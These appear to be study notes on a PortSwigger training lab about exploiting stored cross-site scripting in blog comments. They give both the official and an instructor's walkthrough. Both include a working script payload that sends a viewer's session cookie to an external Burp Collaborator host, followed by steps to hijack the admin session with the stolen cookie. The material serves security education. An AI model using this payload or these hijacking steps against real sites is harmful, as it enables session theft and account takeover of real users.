# Lab: Exploiting cross-site scripting to steal cookies

PRACTITIONER

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie.

Port Swigger solution:

1. Using Burp Suite Professional, go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
    

    ```javascript
<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', 
	{ method: 'POST', 
	mode: 'no-cors', 
	body:document.cookie 
	}); 
</script> 
    ```

    
    This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
    
4. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
5. Take a note of the value of the victim's cookie in the POST body.
6. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to `/my-account` to load the admin user's account page


#### Alternative solution

Alternatively, you could adapt the attack to make the victim post their session cookie within a blog comment by [exploiting the XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf). However, this is far less subtle because it exposes the cookie publicly, and also discloses evidence that the attack was performed.


Instructor solution:
Go to the web application, we can see its a blog site, and we can view a blog post and we can see that we can leave comments. The instructor leaves a comment with a simple <script>alert(1)</script> to confirm XSS. He then goes ahead and types this payload

```javascript
<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', 
	{ method: 'POST', 
	mode: 'no-cors', 
	body:document.cookie 
	}); 
</script> 
```

from here, he explains the payload

He then goes to Burp Suite, goes to Collaborator, clicks copy to clipboard, pastes the url to the address section of the payload, clicks Poll now, and then we can go to back to collaborator and we see that we get requests coming in.

we observe the request and we get two things, a secrets and a session cookie.

We grab the session cookie, go back to the login portion of the web application

when we are at /login

we open our browser console, we go to Application tab, we go to the cookies section on the left side, and we enter the session cookie we got from the xss payload.

We then change the url from /login to /my-account

and we complete the lab